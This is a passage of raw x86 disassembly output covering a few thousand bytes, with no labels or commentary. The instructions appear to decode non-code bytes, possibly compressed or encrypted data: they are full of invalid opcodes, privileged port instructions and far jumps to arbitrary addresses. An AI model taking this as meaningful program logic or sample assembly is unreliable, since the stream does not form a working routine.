  419cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cdd:	push   ecx
  419cde:	sar    BYTE PTR [edi-0x2efd697e],cl
  419ce4:	xor    eax,DWORD PTR [ebx+0xdbe9e4a]
  419cea:	add    al,0x29
  419cec:	addr16 xchg ebx,eax
  419cee:	loopne 0x419cee
  419cf0:	jmp    0x419d0f
  419cf2:	sub    edx,DWORD PTR [ecx-0x6d39c477]
  419cf8:	mov    ah,BYTE PTR [edi-0x6cd68a89]
  419cfe:	loopne 0x419d7a
  419d00:	jmp    0x419d17
  419d02:	sub    eax,DWORD PTR [ebp-0x59]
  419d05:	push   ecx
  419d06:	bound  ecx,QWORD PTR [edi+0x7993950a]
  419d0c:	call   DWORD PTR [edi+0x2]
  419d0f:	mov    DWORD PTR [edx-0x282c0c3f],esp
  419d15:	add    ah,BYTE PTR [edx]
  419d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d18:	and    al,BYTE PTR [ecx]
  419d1a:	popa   
  419d1b:	add    DWORD PTR [edx],eax
  419d1d:	stos   DWORD PTR es:[edi],eax
  419d1e:	cli    
  419d1f:	mov    ecx,cs
  419d21:	(bad)  
  419d22:	retf   
  419d23:	shl    BYTE PTR [ebx],1
  419d25:	add    esp,DWORD PTR [esi+0x26]
  419d28:	fcmovb st,st(1)
  419d2a:	push   ebx
  419d2b:	rcl    DWORD PTR [ebx],cl
  419d2d:	add    ch,BYTE PTR [esi-0x1d]
  419d30:	pop    edx
  419d31:	xchg   DWORD PTR [ecx],ebp
  419d33:	sub    DWORD PTR [edx],esi
  419d35:	inc    ebx
  419d36:	retf   0xbebe
  419d39:	nop
  419d3a:	inc    ebx
  419d3b:	jne    0x419dad
  419d3d:	scas   eax,DWORD PTR es:[edi]
  419d3e:	(bad)  
  419d3f:	jmp    0x419d07
  419d41:	xchg   DWORD PTR ds:0x28d73271,edi
  419d47:	mov    ch,BYTE PTR [edx-0x59]
  419d4a:	jmp    0x419dc1
  419d4c:	sub    DWORD PTR [ebx+0x35eb56e0],esi
  419d52:	sub    ecx,DWORD PTR [ebp-0xbb44c7b]
  419d58:	jmp    0xa68a:0x4bcf4985
  419d5f:	mov    ds,WORD PTR [ebp+0x40]
  419d62:	add    BYTE PTR [ecx],bl
  419d64:	in     al,dx
  419d65:	(bad)  
  419d66:	push   ds
  419d67:	adc    BYTE PTR [edi+0x38],bh
  419d6a:	mov    WORD PTR [ecx],gs
  419d6c:	and    eax,0xad3782c3
  419d71:	or     al,0xc7
  419d73:	mov    ch,0x2b
  419d75:	sbb    BYTE PTR [eax-0x66],ch
  419d78:	imul   ebx,DWORD PTR [ebx-0x37],0xd21e8701
  419d7f:	int3   
  419d80:	add    bl,BYTE PTR [ebx+eax*1-0x2d28e304]
  419d87:	mov    esi,0xfa4231d9
  419d8c:	retf   
  419d8d:	xchg   ebp,eax
  419d8e:	rol    DWORD PTR ds:[esi+0x39],1
  419d92:	in     al,dx
  419d93:	out    dx,al
  419d94:	and    eax,0x4c8dfa26
  419d99:	sbb    eax,0x340bd91f
  419d9e:	ds mov dh,0x53
  419da1:	sub    DWORD PTR [ebx],0xffffffe1
  419da4:	retf   
  419da5:	cmovbe esi,ebp
  419da8:	add    al,0x69
  419daa:	retf   
  419dab:	bound  ebx,QWORD PTR [ebp+0x2be233b0]
  419db1:	std    
  419db2:	jns    0x419d95
  419db4:	fadd   QWORD PTR [ecx+0x57]
  419db7:	push   edx
  419db8:	xor    ebx,ebx
  419dba:	adc    eax,0xce5331b0
  419dbf:	cmp    dh,BYTE PTR [edx-0x42]
  419dc2:	lock outs dx,BYTE PTR ds:[esi]
  419dc4:	cmc    
  419dc5:	sub    DWORD PTR [ebp+0x39f031a7],ecx
  419dcb:	adc    eax,0xf66464d5
  419dd0:	aad    0xd5
  419dd2:	jecxz  0x419db0
  419dd4:	sbb    ecx,DWORD PTR [edx]
  419dd6:	and    bl,dl
  419dd8:	call   0xd2c6:0xda3b08dc
  419ddf:	xchg   ebp,eax
  419de0:	inc    edi
  419de1:	xchg   ecx,eax
  419de2:	jnp    0x419de0
  419de4:	inc    edx
  419de5:	cmp    DWORD PTR [edi-0x56],ecx
  419de8:	in     al,0xe5
  419dea:	pop    ecx
  419deb:	std    
  419dec:	jns    0x419e53
  419dee:	xor    ch,cl
  419df0:	out    dx,al
  419df1:	(bad)  
  419df2:	test   eax,0x9a2f24f4
  419df7:	fninit 
  419df9:	cs das 
  419dfb:	test   BYTE PTR [ecx],0xf
  419dfe:	rcl    BYTE PTR [edx-0x20],cl
  419e01:	and    DWORD PTR [eax],0xf20f1933
  419e07:	inc    ecx
  419e08:	aas    
  419e09:	cmp    DWORD PTR [ebx-0x74aaf3c9],esi
  419e0f:	lods   eax,DWORD PTR ds:[esi]
  419e10:	adc    DWORD PTR [edi+0x1f],edx
  419e13:	mov    edi,0x9e633257
  419e18:	xchg   BYTE PTR ds:0xe5cc82b,al
  419e1e:	int    0x10
  419e20:	xor    bh,BYTE PTR [ebx+0x542018a0]
  419e26:	sub    DWORD PTR [ebx],edx
  419e28:	jo     0x419db9
  419e2a:	inc    ebx
  419e2b:	je     0x419de0
  419e2d:	sbb    edi,eax
  419e2f:	mov    ds:0x1a7441e2,al
  419e34:	and    eax,0x8cf6f8
  419e39:	sub    ah,ah
  419e3b:	lock aaa 
  419e3d:	push   ecx
  419e3e:	test   DWORD PTR [esi],ebp
  419e40:	(bad)  
  419e41:	mov    dl,BYTE PTR [ebx+0x71]
  419e44:	mov    al,0x8e
  419e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e47:	call   0xddb0:0xa60e95e6
  419e4e:	outs   dx,DWORD PTR ds:[esi]
  419e4f:	jl     0x419e2d
  419e51:	stos   BYTE PTR es:[edi],al
  419e52:	(bad)  
  419e53:	call   0x89f7:0x90ebc077
  419e5a:	adc    dl,dl
  419e5c:	add    esp,DWORD PTR [ebp-0x23]
  419e5f:	(bad)
  419e62:	loopne 0x419e47
  419e64:	je     0x419eb3
  419e66:	push   ss
  419e67:	int3   
  419e68:	adc    dl,BYTE PTR [edx+ebx*2-0x7be75cd7]
  419e6f:	xchg   ebp,eax
  419e70:	or     edi,esi
  419e72:	ret    0xd964
  419e75:	in     eax,0x72
  419e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e78:	ds mov ah,0xc8
  419e7b:	push   es
  419e7c:	int3   
  419e7d:	fst    DWORD PTR [esp+eiz*8]
  419e80:	imul   ebp,DWORD PTR [edx],0x35
  419e83:	lock xchg DWORD PTR es:[eax+0x28ad6253],ebp
  419e8b:	cli    
  419e8c:	jns    0x419eeb
  419e8e:	xor    cl,bh
  419e90:	retf   
  419e91:	aad    0x73
  419e93:	adc    dl,bl
  419e95:	mov    al,0xa
  419e97:	xchg   esi,eax
  419e98:	fidivr WORD PTR [edx+eiz*2-0x6c]
  419e9c:	loop   0x419ef5
  419e9e:	lods   eax,DWORD PTR ds:[esi]
  419e9f:	inc    ebp
  419ea0:	imul   edx,DWORD PTR [ebx+0x32ceabeb],0xffffffb6
  419ea7:	inc    ecx
  419ea8:	jmp    0x971f:0xd484699b
  419eaf:	pop    edx
  419eb0:	fidivr WORD PTR [ecx+0x16]
  419eb3:	sbb    ah,BYTE PTR [eax]
  419eb5:	pusha  
  419eb6:	dec    edx
  419eb7:	sub    dl,al
  419eb9:	fs pop eax
  419ebb:	dec    ecx
  419ebc:	mov    esp,0x38f3db89
  419ec1:	cmp    al,0x25
  419ec3:	aas    
  419ec4:	rcr    DWORD PTR [edi],cl
  419ec6:	int    0x56
  419ec8:	rcr    DWORD PTR [ebx+0x20],1
  419ecb:	jmp    0xf46c8be9
  419ed0:	mov    al,0xe0
  419ed2:	mov    dh,0x1f
  419ed4:	rcl    ebp,1
  419ed6:	sahf   
  419ed7:	mov    dl,0xe5
  419ed9:	aaa    
  419eda:	and    dl,BYTE PTR [esi+ebx*8-0x5659f578]
  419ee1:	scas   al,BYTE PTR es:[edi]
  419ee2:	data16 stc 
  419ee4:	dec    eax
  419ee5:	fisub  DWORD PTR [eax+0x6c888669]
  419eeb:	pop    edx
  419eec:	loope  0x419ead
  419eee:	sub    DWORD PTR es:[edi-0x46],ebx
  419ef2:	repnz sub DWORD PTR [esp+edx*2],ebp
  419ef6:	or     al,0x74
  419ef8:	mov    dl,0x5
  419efa:	stos   BYTE PTR es:[edi],al
  419efb:	sbb    DWORD PTR [edi+0x74f0105c],esp
  419f01:	popa   
  419f02:	inc    esp
  419f03:	out    dx,eax
  419f04:	xlat   BYTE PTR ds:[ebx]
  419f05:	or     eax,0x86809af4
  419f0a:	bnd jmp 0x419ee9
  419f0d:	(bad)  
  419f0e:	hlt    
  419f0f:	fs add al,0x8f
  419f12:	jmp    0x419f49
  419f14:	jge    0x419f11
  419f16:	sub    BYTE PTR [ebx+0x5e],bl
  419f19:	xor    cl,BYTE PTR [edi+0x1db2889f]
  419f1f:	mov    edx,0x21d343c1
  419f24:	sub    al,0x2a
  419f26:	test   BYTE PTR [eax+0x46],bh
  419f29:	(bad)  
  419f2a:	pop    ds
  419f2b:	ficomp DWORD PTR [edi+0x1a]
  419f2e:	adc    eax,0x3237fed9
  419f33:	mov    esi,0x3a11f1
  419f38:	inc    edx
  419f39:	jmp    0x419f99
  419f3b:	cmp    eax,0xcfb08c27
  419f40:	push   ebp
  419f41:	daa    
  419f42:	push   esi
  419f43:	clc    
  419f44:	gs mov bl,0xc8
  419f47:	sub    ebp,DWORD PTR [eax-0x684e4037]
  419f4d:	call   0x9fa0:0x71b89ea1
  419f54:	xor    edx,DWORD PTR [esi+0x23]
  419f57:	stos   BYTE PTR es:[edi],al
  419f58:	cmc    
  419f59:	pop    es
  419f5a:	add    al,0x59
  419f5c:	push   cs
  419f5d:	xchg   esp,eax
  419f5e:	push   ebp
  419f5f:	repz dec esi
  419f61:	imul   esi,DWORD PTR [esi+0x2b000d24],0x7f99fbe9
  419f6b:	leave  
  419f6c:	jae    0x419fad
  419f6e:	jno    0x419ef3
  419f70:	mov    ecx,0x98ce4601
  419f75:	xchg   dh,al
  419f77:	push   edx
  419f78:	mov    bl,bl
  419f7a:	stos   DWORD PTR es:[edi],eax
  419f7b:	push   ecx
  419f7c:	adc    DWORD PTR [ecx+edi*8],edx
  419f7f:	push   esi
  419f80:	lea    ebp,[ebx-0x420ec052]
  419f86:	(bad)  [esi+0x6f60f384]
  419f8c:	call   0xa7267e3
  419f91:	xchg   ah,ch
  419f93:	addr16 jmp 0x9ce3:0xaf53e52d
  419f9b:	dec    eax
  419f9c:	mov    WORD PTR [esp+eax*1],fs
  419f9f:	iret   
  419fa0:	(bad)  
  419fa1:	imul   edi
  419fa3:	fwait
  419fa4:	(bad)  
  419fa5:	xor    al,0xec
  419fa7:	push   ds
  419fa8:	dec    ebp
  419fa9:	mov    BYTE PTR [esi],cl
  419fab:	or     eax,0x3db467a
  419fb0:	in     al,0x5d
  419fb2:	icebp  
  419fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb4:	mov    ebp,ecx
  419fb6:	xor    DWORD PTR ds:0x57c6ffcb,0xffffffc1
  419fbd:	push   ebx
  419fbe:	lahf   
  419fbf:	out    dx,eax
  419fc0:	not    bh
  419fc2:	popa   
  419fc3:	inc    esi
  419fc4:	sbb    cl,ch
  419fc6:	dec    ebx
  419fc7:	fcom   QWORD PTR [edx]
  419fc9:	fistp  DWORD PTR [esi+0x20]
  419fcc:	ds mov dh,0xca
  419fcf:	inc    edx
  419fd0:	jo     0x419fd7
  419fd2:	push   edi
  419fd3:	lock jae 0x41a01a
  419fd6:	lock jne 0x419f6d
  419fd9:	mov    dh,0x8d
  419fdb:	jbe    0x41a033
  419fdd:	sub    edx,DWORD PTR ds:0x8cdfff21
  419fe3:	aad    0x5f
  419fe5:	xchg   edx,eax
  419fe6:	(bad)  
  419fe7:	outs   dx,DWORD PTR ds:[esi]
  419fe8:	mov    ecx,gs
  419fea:	into   
  419feb:	(bad)  
  419fec:	scas   al,BYTE PTR es:[edi]
  419fed:	pop    es
  419fee:	les    ecx,FWORD PTR [ecx+0x42b3f62b]
  419ff4:	and    bl,BYTE PTR [ecx+0x7f7aa8d3]
  419ffa:	retf   0x2e85
  419ffd:	sbb    esp,ebx
  419fff:	(bad)  
  41a000:	pop    DWORD PTR [ebx-0x2fd9775c]
  41a006:	jg     0x419f8f
  41a008:	(bad)  
  41a009:	iret   
  41a00a:	xor    al,0x70
  41a00c:	fdiv   st(2),st
  41a00e:	and    BYTE PTR [ebx+0x517c4188],0xb0
  41a015:	ins    DWORD PTR es:[edi],dx
  41a016:	pushf  
  41a017:	clc    
  41a018:	mov    ?,WORD PTR [ebx+0x42]
  41a01b:	mov    ebx,ebx
  41a01d:	adc    al,0xec
  41a01f:	ja     0x41a00b
  41a021:	jb     0x41a014
  41a023:	dec    edi
  41a024:	hlt    
  41a025:	mov    edx,0x7d7551a5
  41a02a:	adc    edi,DWORD PTR [ebx-0x243d2c68]
  41a030:	or     cl,BYTE PTR ds:0x15031ece
  41a036:	cmp    ebp,esi
  41a038:	add    BYTE PTR [esi-0x5d],bh
  41a03b:	push   es
  41a03c:	retf   
  41a03d:	and    dl,BYTE PTR [edx+0x3ebcce30]
  41a043:	mov    eax,0xce7e689a
  41a048:	ins    DWORD PTR es:[edi],dx
  41a049:	sub    ah,ch
  41a04b:	ins    BYTE PTR es:[edi],dx
  41a04c:	mov    dl,0xee
  41a04e:	mov    WORD PTR [edi-0x5d07f631],fs
  41a054:	cs ins BYTE PTR es:[edi],dx
  41a056:	rcr    BYTE PTR [ecx-0x5def9c3d],0xb8
  41a05d:	in     al,dx
  41a05e:	ficom  WORD PTR [edi-0x142de8ee]
  41a064:	dec    ecx
  41a065:	ja     0x419ff6
  41a067:	mov    al,ds:0xc26f871f
  41a06c:	retf   
  41a06d:	ss ins BYTE PTR es:[edi],dx
  41a06f:	fld    TBYTE PTR [ebx+eiz*2+0x740bf45]
  41a076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a077:	sub    eax,0xc02f9b47
  41a07c:	push   esi
  41a07d:	add    edi,edx
  41a07f:	mov    al,ds:0x1c50bc72
  41a084:	jnp    0x41a08d
  41a086:	int    0x9c
  41a088:	jl     0x41a0cb
  41a08a:	lock ss inc edx
  41a08d:	aas    
  41a08e:	ror    DWORD PTR [esi],1
  41a090:	push   ecx
  41a091:	push   ds
  41a092:	pop    ecx
  41a093:	add    DWORD PTR [ecx+0x16],esi
  41a096:	inc    esi
  41a097:	mov    ecx,0x2789b37a
  41a09c:	or     DWORD PTR [ebx-0x4f5403b0],0x2e929932
  41a0a6:	mov    cl,0x8b
  41a0a8:	cmp    al,0xf9
  41a0aa:	imul   esi,DWORD PTR [esi+0x3c3846ab],0xd5f4acf8
  41a0b4:	dec    edi
  41a0b5:	aaa    
  41a0b6:	into   
  41a0b7:	pop    esi
  41a0b8:	(bad)  
  41a0b9:	shl    BYTE PTR [edi],cl
  41a0bb:	sbb    ebp,ebx
  41a0bd:	out    dx,eax
  41a0be:	aad    0x68
  41a0c0:	mov    ss,WORD PTR [edi-0x7afc4c98]
  41a0c6:	push   edx
  41a0c7:	adc    BYTE PTR [edx],al
  41a0c9:	test   BYTE PTR [esi+0x2a5365fb],ch
  41a0cf:	mov    ds:0x80d81ce9,eax
  41a0d4:	or     BYTE PTR [ebx],bl
  41a0d6:	in     al,0x25
  41a0d8:	sahf   
  41a0d9:	stos   BYTE PTR es:[edi],al
  41a0da:	push   ecx
  41a0db:	xor    al,0x11
  41a0dd:	call   0xa3405ec9
  41a0e2:	lds    ecx,FWORD PTR [edi+edx*2]
  41a0e5:	ss clc 
  41a0e7:	scas   eax,DWORD PTR es:[edi]
  41a0e8:	ror    BYTE PTR [esi],0xa6
  41a0eb:	mov    ecx,ebx
  41a0ed:	(bad)  
  41a0ee:	in     al,0x8b
  41a0f0:	jmp    0x34bc6282
  41a0f5:	data16 clc 
  41a0f7:	ds ret 0xcd06
  41a0fb:	jno    0x41a0e6
  41a0fd:	fdivr  DWORD PTR [ecx-0x7b]
  41a100:	arpl   WORD PTR [esi+eax*4-0x3c],di
  41a104:	sub    esi,DWORD PTR [ebx]
  41a106:	ins    BYTE PTR es:[edi],dx
  41a107:	and    al,0xb9
  41a109:	icebp  
  41a10a:	add    DWORD PTR [eax],ecx
  41a10c:	addr16 sbb eax,0xcfdf0054
  41a112:	xor    eax,0xc89f1f49
  41a117:	mov    ds:0x62261200,al
  41a11c:	gs mov dh,0x50
  41a11f:	sbb    DWORD PTR [esi-0x2f],0x40cbe326
  41a126:	mov    BYTE PTR [eax],0xcb
  41a129:	mov    bl,0x56
  41a12b:	loope  0x41a1a8
  41a12d:	xor    bh,BYTE PTR [ebx]
  41a12f:	es jns 0x41a0b8
  41a132:	mov    ah,0xe3
  41a134:	dec    edx
  41a135:	rcr    bl,1
  41a137:	mov    esi,0x89344458
  41a13c:	ficom  DWORD PTR [edi-0x1f]
  41a13f:	add    eax,0x4a64f533
  41a144:	xchg   ebx,esp
  41a146:	sub    al,0x46
  41a148:	inc    ebx
  41a149:	pop    ss
  41a14a:	mov    ecx,?
  41a14c:	js     0x41a0ce
  41a14e:	jns    0x41a151
  41a150:	clc    
  41a151:	out    dx,al
  41a152:	enter  0x2b54,0x19
  41a156:	shl    DWORD PTR [eax+0x795c551e],0x27
  41a15d:	or     eax,0xe18f3f1e
  41a162:	xor    edx,DWORD PTR [ecx]
  41a164:	mov    BYTE PTR [eax-0x7c],al
  41a167:	push   cs
  41a168:	call   0x99a292cb
  41a16d:	pop    ebx
  41a16e:	jmp    0xe57d:0x3a5ab17f
  41a175:	sbb    ecx,DWORD PTR [edx+0x2e0ce2a7]
  41a17b:	cmc    
  41a17c:	mov    bh,BYTE PTR [ebp+0x6f]
  41a17f:	ret    
  41a180:	call   0x3ffad4cc
  41a185:	xchg   edx,eax
  41a186:	(bad)  
  41a187:	cld    
  41a188:	call   0x1222c8ee
  41a18d:	xor    eax,esi
  41a18f:	mov    cl,al
  41a191:	pop    ecx
  41a192:	sub    al,0x61
  41a194:	lods   al,BYTE PTR ds:[esi]
  41a195:	push   ebx
  41a196:	daa    
  41a197:	or     eax,0x4e2b9cce
  41a19c:	daa    
  41a19d:	cli    
  41a19e:	repnz or ch,bh
  41a1a1:	dec    eax
  41a1a2:	xor    DWORD PTR [esi+0x2088f50f],ecx
  41a1a8:	cmp    BYTE PTR [ebp+0x30fbe86a],0xd0
  41a1af:	in     al,dx
  41a1b0:	cmp    dh,BYTE PTR [eax-0x12ffe7de]
  41a1b6:	arpl   WORD PTR [esi-0x7bebfe27],dx
  41a1bc:	ds pop edx
  41a1be:	rcl    edi,cl
  41a1c0:	data16 sub ch,BYTE PTR [ecx-0x15]
  41a1c4:	xor    BYTE PTR [esi+eax*2],dh
  41a1c7:	mov    DWORD PTR [esi+0x78],ebp
  41a1ca:	xor    ebp,esp
  41a1cc:	icebp  
  41a1cd:	add    esi,DWORD PTR [edx-0x12]
  41a1d0:	lds    edx,FWORD PTR ds:[edi]
  41a1d3:	jecxz  0x41a1e0
  41a1d5:	mov    ch,0x1e
  41a1d7:	jl     0x41a194
  41a1d9:	cmp    eax,0x5b79d3fa
  41a1de:	add    al,0x40
  41a1e0:	mov    cl,0x6e
  41a1e2:	scas   eax,DWORD PTR es:[edi]
  41a1e3:	ja     0x41a16a
  41a1e5:	ficomp DWORD PTR [edi+0x5ad2fec4]
  41a1eb:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ed:	data16 (bad) 
  41a1ef:	lock add al,0x11
  41a1f2:	dec    esp
  41a1f3:	sti    
  41a1f4:	pop    es
  41a1f5:	adc    al,0xd2
  41a1f7:	jmp    0x41a198
  41a1f9:	mov    WORD PTR [ecx],gs
  41a1fb:	stc    
  41a1fc:	xor    dh,BYTE PTR [edi]
  41a1fe:	cdq    
  41a1ff:	add    al,0xef
  41a201:	mov    bl,0x87
  41a203:	jmp    0x41a268
  41a205:	inc    DWORD PTR [ebx]
  41a207:	out    dx,eax
  41a208:	in     al,dx
  41a209:	in     al,0x94
  41a20b:	pop    ss
  41a20c:	jle    0x41a1db
  41a20e:	push   0xffffff81
  41a210:	daa    
  41a211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a212:	pop    ss
  41a213:	mov    edx,0x6f78533b
  41a218:	sbb    dl,BYTE PTR ds:0x4abb860
  41a21e:	pop    esp
  41a21f:	sbb    eax,ebp
  41a221:	lea    esp,[ecx-0x46]
  41a224:	aas    
  41a225:	jb     0x41a207
  41a227:	scas   eax,DWORD PTR es:[edi]
  41a228:	mov    cl,0x9d
  41a22a:	add    ch,BYTE PTR ds:0xacca3367
  41a230:	and    DWORD PTR [ecx+0x29],0xffffffd1
  41a234:	pop    es
  41a235:	push   eax
  41a236:	shl    DWORD PTR [esi+0x12],0x4e
  41a23a:	popa   
  41a23b:	jo     0x41a2b1
  41a23d:	addr16 jge 0x41a224
  41a240:	adc    BYTE PTR [ecx+edi*8+0x42],cl
  41a244:	pop    ecx
  41a245:	sub    dl,BYTE PTR [ebx-0x6576cb8a]
  41a24b:	clc    
  41a24c:	xor    bh,bl
  41a24e:	add    dl,BYTE PTR [ebp-0x25]
  41a251:	(bad)  
  41a252:	aaa    
  41a253:	inc    edi
  41a254:	sub    DWORD PTR [edx],edi
  41a256:	leave  
  41a257:	pop    ss
  41a258:	out    dx,al
  41a259:	sub    DWORD PTR [ecx],ebp
  41a25b:	fsubr  DWORD PTR [edi]
  41a25d:	stos   BYTE PTR es:[edi],al
  41a25e:	fmul   QWORD PTR [ecx+ebx*2]
  41a261:	xchg   ebp,eax
  41a262:	and    ecx,edx
  41a264:	rcl    DWORD PTR [ecx-0x36],cl
  41a267:	out    0xf5,al
  41a269:	(bad)  
  41a26a:	call   0xb526:0xcd5caa8b
  41a271:	sti    
  41a272:	pusha  
  41a273:	mov    esi,0xeff5cd1
  41a278:	dec    edi
  41a279:	mov    ds:0x7d4507a6,al
  41a27e:	jmp    0x6fa8:0xb39292f8
  41a285:	out    0x26,eax
  41a287:	daa    
  41a288:	or     eax,0x273d8fa
  41a28d:	(bad)  
  41a28e:	(bad)  
  41a28f:	fidivr DWORD PTR [esi+0x2f223106]
  41a295:	fdivp  st(4),st
  41a297:	ds add eax,0xbeb25e0f
  41a29d:	dec    ebp
  41a29e:	xchg   ebx,eax
  41a29f:	push   esi
  41a2a0:	out    dx,al
  41a2a1:	loope  0x41a2e0
  41a2a3:	nop    DWORD PTR [ebx]
  41a2a6:	inc    ebx
  41a2a7:	push   ebx
  41a2a8:	cmc    
  41a2a9:	test   eax,0xb11a62f
  41a2ae:	add    al,0x38
  41a2b0:	jmp    0x41a31a
  41a2b2:	add    DWORD PTR [eax],esp
  41a2b4:	or     BYTE PTR [edi-0x7a],ah
  41a2b7:	loopne 0x41a244
  41a2b9:	(bad)  
  41a2ba:	fild   DWORD PTR [edx]
  41a2bc:	fistp  QWORD PTR [ecx]
  41a2be:	mov    cl,0x27
  41a2c0:	add    BYTE PTR [edi+0x1aabc81b],al
  41a2c6:	out    0x52,al
  41a2c8:	jae    0x41a2ab
  41a2ca:	imul   edi,DWORD PTR [edi+0x6d],0x1b
  41a2ce:	and    edx,DWORD PTR [ebx-0xdb61c48]
  41a2d4:	pop    es
  41a2d5:	ins    BYTE PTR es:[edi],dx
  41a2d6:	rcl    cl,cl
  41a2d8:	sbb    al,0xaf
  41a2da:	scas   al,BYTE PTR es:[edi]
  41a2db:	inc    edi
  41a2dc:	add    dh,BYTE PTR [esp+ecx*8-0x4e]
  41a2e0:	not    dh
  41a2e2:	ins    DWORD PTR es:[edi],dx
  41a2e3:	add    DWORD PTR [ebp+0x1f],ebx
  41a2e6:	xchg   ebx,eax
  41a2e7:	and    al,0x2d
  41a2e9:	scas   al,BYTE PTR es:[edi]
  41a2ea:	or     BYTE PTR [ebp-0x18],0xb7
  41a2ee:	and    BYTE PTR es:[edi-0x3454a248],dh
  41a2f5:	fisub  WORD PTR [ebx-0x38]
  41a2f8:	test   DWORD PTR [eax+0x1a798d6a],0xbe64725d
  41a302:	jnp    0x41a2dc
  41a304:	and    esp,edi
  41a306:	mov    ebp,DWORD PTR ds:0xb4548e03
  41a30c:	imul   ebp,esp,0xffffff81
  41a30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a310:	std    
  41a311:	ret    
  41a312:	popa   
  41a313:	rcr    BYTE PTR [edi],1
  41a315:	(bad)
  41a319:	pop    DWORD PTR [ebx+0x662e13a1]
  41a31f:	mov    ss,ecx
  41a321:	cli    
  41a322:	mov    esi,DWORD PTR [ecx-0x70c340fb]
  41a328:	jnp    0x41a35f
  41a32a:	fsubp  st(5),st
  41a32c:	and    BYTE PTR [edi+0x3dfdb938],ah
  41a332:	xlat   BYTE PTR ds:[ebx]
  41a333:	jecxz  0x41a361
  41a335:	scas   eax,DWORD PTR es:[edi]
  41a336:	sub    ah,BYTE PTR [ebx-0x60cba1b]
  41a33c:	sbb    al,0xd7
  41a33e:	bound  ebp,QWORD PTR [ebp+0x3f0c4d8e]
  41a344:	stos   BYTE PTR es:[edi],al
  41a345:	call   0xff7c:0x296dcea4
  41a34c:	jmp    0x6638:0xfce74fd0
  41a353:	ins    DWORD PTR es:[edi],dx
  41a354:	inc    edi
  41a355:	ror    ebx,1
  41a357:	imul   esi,DWORD PTR [edx+0x120b249],0x1a7586c5
  41a361:	or     al,0xc6
  41a363:	jecxz  0x41a32e
  41a365:	aaa    
  41a366:	sub    eax,0x64280ee6
  41a36b:	aad    0xb1
  41a36d:	inc    ebp
  41a36e:	dec    edi
  41a36f:	in     al,dx
  41a370:	nop
  41a371:	mov    ah,0x3a
  41a373:	popf   
  41a374:	cs lds ecx,FWORD PTR gs:[ebx-0x4b450fae]
  41a37c:	mov    ch,0x7
  41a37e:	mov    dl,BYTE PTR [ebx]
  41a380:	mov    esp,0x47e65ef4
  41a385:	push   esp
  41a386:	and    BYTE PTR [esi-0x7289b52f],0x7a
  41a38d:	sbb    DWORD PTR [ecx],ebp
  41a38f:	ret    0xe2f0
  41a392:	imul   edx,DWORD PTR [ebp+0x41],0x64
  41a396:	or     eax,0x7362a2e6
  41a39b:	push   ebp
  41a39c:	ins    DWORD PTR es:[edi],dx
  41a39d:	pusha  
  41a39e:	xchg   esi,eax
  41a39f:	jl     0x41a35f
  41a3a1:	mov    esp,0xf19187b
  41a3a6:	sahf   
  41a3a7:	pop    edx
  41a3a8:	retf   0x590b
  41a3ab:	xchg   ecx,eax
  41a3ac:	fs xor eax,0x99d9caff
  41a3b2:	mov    ebp,0xd01b299
  41a3b7:	ret    0xa6a4
  41a3ba:	mov    bh,0x81
  41a3bc:	(bad)  
  41a3bd:	call   0x4112:0xe1307bcd
  41a3c4:	aaa    
  41a3c5:	push   es
  41a3c6:	ins    BYTE PTR es:[edi],dx
  41a3c7:	daa    
  41a3c8:	popa   
  41a3c9:	push   esi
  41a3ca:	loope  0x41a357
  41a3cc:	push   0x41
  41a3ce:	inc    esi
  41a3cf:	aas    
  41a3d0:	repz or eax,DWORD PTR [ecx]
  41a3d3:	imul   esp,DWORD PTR [edi-0x4f],0x974c276e
  41a3da:	jecxz  0x41a3b1
  41a3dc:	jmp    0x2480ba3c
  41a3e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3e2:	retf   
  41a3e3:	mov    eax,ds:0xae9712ef
  41a3e8:	jns    0x41a453
  41a3ea:	add    al,0x78
  41a3ec:	mov    BYTE PTR [edx-0x70],0xf8
  41a3f0:	out    dx,al
  41a3f1:	ins    DWORD PTR es:[edi],dx
  41a3f2:	mov    ds:0xa23dc9e1,eax
  41a3f7:	jecxz  0x41a45c
  41a3f9:	fldcw  WORD PTR [edx]
  41a3fb:	test   eax,0xcae64731
  41a400:	mov    dl,0x19
  41a402:	mov    dl,0x79
  41a404:	add    DWORD PTR [edi+0xcc6ee86],edx
  41a40a:	sbb    esp,ebx
  41a40c:	pop    ss
  41a40d:	aaa    
  41a40e:	xchg   dh,ah
  41a410:	xchg   BYTE PTR [ebx+ecx*2],dl
  41a413:	loope  0x41a42f
  41a415:	or     ecx,esi
  41a417:	mov    gs,ebx
  41a419:	cdq    
  41a41a:	add    eax,edi
  41a41c:	cmp    edx,DWORD PTR [edi-0x2a]
  41a41f:	mov    bl,BYTE PTR [ebp+edx*8+0x70]
  41a423:	mov    ecx,0x524b630f
  41a428:	arpl   WORD PTR [ebx+ebx*8-0x8],dx
  41a42c:	xlat   BYTE PTR ds:[ebx]
  41a42d:	add    esi,eax
  41a42f:	aaa    
  41a430:	stos   BYTE PTR es:[edi],al
  41a431:	lods   eax,DWORD PTR ds:[esi]
  41a432:	outs   dx,DWORD PTR ds:[esi]
  41a433:	ffree  st(3)
  41a435:	fucomip st,st(3)
  41a437:	jb     0x41a42c
  41a439:	pop    ebp
  41a43a:	stos   BYTE PTR es:[edi],al
  41a43b:	and    eax,0xfeeaf731
  41a440:	jmp    0x41a465
  41a442:	arpl   bp,bx
  41a444:	jecxz  0x41a425
  41a446:	jecxz  0x41a45a
  41a448:	repz cmp eax,0xd73145aa
  41a44e:	jmp    0x65dd:0x3203f0fe
  41a455:	mov    bl,0xcb
  41a457:	jmp    0xb731:0x65aa1d66
  41a45e:	pop    edx
  41a45f:	(bad)  
  41a460:	pushf  
  41a461:	xchg   esp,eax
  41a462:	xchg   ebp,ebx
  41a464:	addr16 xchg ebx,eax
  41a466:	mov    esi,0xb2fdf366
  41a46b:	test   DWORD PTR [edx],ecx
  41a46d:	xchg   edi,eax
  41a46e:	xchg   edx,eax
